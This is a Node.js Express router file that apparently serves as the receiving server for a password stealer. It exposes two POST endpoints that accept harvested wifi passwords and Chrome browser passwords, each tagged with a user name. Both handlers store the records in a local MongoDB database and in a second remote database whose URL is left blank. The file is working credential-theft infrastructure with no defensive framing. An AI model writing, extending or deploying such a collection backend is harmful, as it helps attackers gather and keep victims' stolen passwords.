var express = require('express');
var router = express.Router();

/* GET users listing. */
router.get('/', function(req, res, next) {
  res.send('respond with a resource');
});

router.post('/storePass',function (req,res) {
  
  var MongoClient = require('mongodb').MongoClient;
  var localUrl = "mongodb://localhost:27017/passwords";
  
  MongoClient.connect(localUrl, function(err, db) {
  if (err) throw err;
  var dbo = db.db("passwords");
  //change hardcoded to user name
  let dbdata = {}
  dbdata.user = req.body.user;
  dbdata.passwords = req.body.passwords;
  dbo.collection('wifiPasswords').insertOne(dbdata, function(err, res) {
      if (err) throw err;
      db.close();
    });
  });

  var remoteUrl = '';
  MongoClient.connect(remoteUrl, function(err, db) {
    if (err) throw err;
    var dbo = db.db("passwords");
    console.log("connected");
    
    let dbdata = {}
    dbdata.user = req.body.user;
    dbdata.passwords = req.body.passwords;
    dbo.collection('wifiPasswords').insertOne(dbdata, function(err, res) {
        if (err) throw err;
        db.close();
      });
    });

  res.send("1");
});


router.post('/storeChromePass',function(req,res){
  
  var MongoClient = require('mongodb').MongoClient;
  var localUrl = "mongodb://localhost:27017/passwords";
  
  MongoClient.connect(localUrl, function(err, db) {
  if (err){
    console.log(err);
    throw err;
  } 
  var dbo = db.db("passwords");
  let dbdata = {}
  dbdata.user = req.body.user;
  dbdata.passwords = req.body.passwords;
  dbo.collection('chromePasswords').insertOne(dbdata, function(err, res) {
      if (err) throw err;
      db.close();
    });
  });

  var remoteUrl = '';
  MongoClient.connect(remoteUrl, function(err, db) {
    if (err) throw err;
    var dbo = db.db("passwords");
    console.log("connected");
    
    let dbdata = {}
    dbdata.user = req.body.user;
    dbdata.passwords = req.body.passwords;
    dbo.collection('chromePasswords').insertOne(dbdata, function(err, res) {
        if (err) throw err;
        db.close();
      });
    });

  res.send("1");
});

module.exports = router;
